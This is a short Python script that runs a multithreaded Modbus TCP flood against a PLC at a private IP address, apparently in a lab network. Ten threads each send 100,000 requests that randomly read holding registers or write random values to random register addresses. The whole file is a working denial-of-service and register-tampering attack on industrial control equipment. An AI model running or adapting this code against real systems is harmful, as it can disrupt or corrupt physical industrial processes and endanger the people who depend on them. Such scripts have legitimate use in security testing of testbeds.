import threading
import random
from pymodbus.client import ModbusTcpClient

# Target PLC IP and port
TARGET_IP = "172.18.0.11"
TARGET_PORT = 502

# Function for Modbus flood attack
def modbus_flood_thread(thread_id, request_count):
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    if client.connect():
        print(f"Thread {thread_id} connected to {TARGET_IP}:{TARGET_PORT}")
        for i in range(request_count):
            start_address = random.randint(0, 1000)
            count = random.randint(50, 100)  # Larger payload
            try:
                # Randomize between read and write requests
                if random.choice([True, False]):
                    client.read_holding_registers(start_address, count)
                else:
                    client.write_register(start_address, random.randint(0, 65535))
                print(f"Thread {thread_id} sent request {i+1}")
            except Exception as e:
                print(f"Thread {thread_id} error: {e}")
        client.close()
    else:
        print(f"Thread {thread_id} failed to connect.")

# Number of threads and requests per thread
THREAD_COUNT = 10
REQUESTS_PER_THREAD = 100000

# Launch threads
threads = []
for thread_id in range(THREAD_COUNT):
    t = threading.Thread(target=modbus_flood_thread, args=(thread_id, REQUESTS_PER_THREAD))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
